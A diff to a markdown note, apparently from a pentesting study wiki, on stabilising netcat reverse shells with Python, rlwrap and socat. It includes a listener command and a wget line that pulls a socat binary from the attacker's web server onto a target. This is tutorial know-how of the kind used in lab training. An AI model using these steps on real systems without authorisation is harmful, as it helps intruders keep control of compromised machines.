@@ -1,3 +1,10 @@
+---
+title: "Netcat Shell Stabilisation"
+created: 2026-03-11
+type: tool
+tags: [linux, shells, tool, windows]
+---
+
 There are many ways to stabilise a netcat shell, we will be looking at 3 of them,  Stabilisation of Windows reverse shells tends to be significantly harder; however, the second technique that we'll be covering here is particularly useful for it:
 ## 1. Using Python:
 
@@ -12,9 +19,9 @@ Note that if the shell dies, any input in your own terminal will not be visible 
 ## 2. using rlwrap:
 
 To use rlwrap, we invoke a slightly different listener by running the following command `rlwrap nc -lvnp <port>`, This technique is particularly useful when dealing with Windows shells, When dealing with a Linux target, it's possible to completely stabilise, by using the same trick as in step three of the previous technique: background the shell with Ctrl + Z, then use `stty raw -echo; fg` to stabilise and re-enter the shell.
-## 3. using Socat:
+## 3. using [[Socat]]:
 
-Bear in mind that this technique is limited to Linux targets, as a Socat shell on Windows will be no more stable than a netcat shell.  A typical way to achieve this would be using a webserver on the attacking machine inside the directory containing your socat binary (`sudo python3 -m http.server 80`), then, on the target machine, using the netcat shell to download the file. On Linux this would be accomplished with curl or wget (`wget <LOCAL-IP>/socat -O /tmp/socat`
+Bear in mind that this technique is limited to Linux targets, as a Socat shell on Windows will be no more stable than a netcat shell.  A typical way to achieve this would be using a webserver on the attacking machine inside the directory containing your socat binary (`sudo python3 -m http.server 80`), then, on the target machine, using the netcat shell to download the file. On Linux this would be accomplished with [[curl]] or wget (`wget <LOCAL-IP>/socat -O /tmp/socat`
 
 First, transfer a [socat static compiled binary](https://github.com/andrew-d/static-binaries/blob/master/binaries/linux/x86_64/socat?raw=true) (a version of the program compiled to have no dependencies) up to the target machine. 
 ## To change the number of rows and columns in a terminal:
